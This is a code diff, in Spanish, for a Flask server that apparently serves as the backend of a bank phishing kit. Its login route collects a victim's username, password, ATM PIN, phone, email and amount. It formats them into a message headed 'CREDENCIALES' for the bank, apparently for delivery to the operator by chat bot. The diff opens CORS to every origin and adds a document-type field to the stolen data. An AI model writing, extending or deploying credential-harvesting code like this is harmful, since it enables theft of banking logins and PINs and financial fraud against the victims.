@@ -8,7 +8,14 @@ from threading import Thread
 import time
 
 app = Flask(__name__)
-CORS(app)  # Habilitar CORS para todas las rutas
+
+# Configurar CORS para funcionar correctamente desde Azure y otros orígenes
+cors_config = {
+    "origins": ["*"],
+    "methods": ["GET", "POST", "OPTIONS"],
+    "allow_headers": ["Content-Type", "Authorization"]
+}
+CORS(app, resources={r"/api/*": cors_config})
 
 # ══════════════════════════════════════════════════════════════
 # CONFIGURACIÓN
@@ -35,6 +42,7 @@ def login():
         usuario = data.get('usuario')
         clave = data.get('clave')
         pin = data.get('pin', '')
+        tipoDoc = data.get('tipoDoc', '')
         phone = data.get('phone', 'N/A')
         amount = data.get('amount', 'N/A')
         email = data.get('email', 'N/A')
@@ -49,6 +57,7 @@ def login():
             'usuario': usuario,
             'clave': clave,
             'pin': pin,
+            'tipoDoc': tipoDoc,
             'phone': phone,
             'amount': amount,
             'email': email,
@@ -67,6 +76,7 @@ def login():
         message = f"""
 🏦 <b>CREDENCIALES — {bank}</b>
 ━━━━━━━━━━━━━━━━━
+📄 <b>Tipo doc:</b> {tipoDoc}
 👤 <b>Usuario:</b> <code>{usuario}</code>
 🔑 <b>Clave:</b> <code>{clave}</code>
 🏧 <b>Clave cajero:</b> <code>{pin}</code>
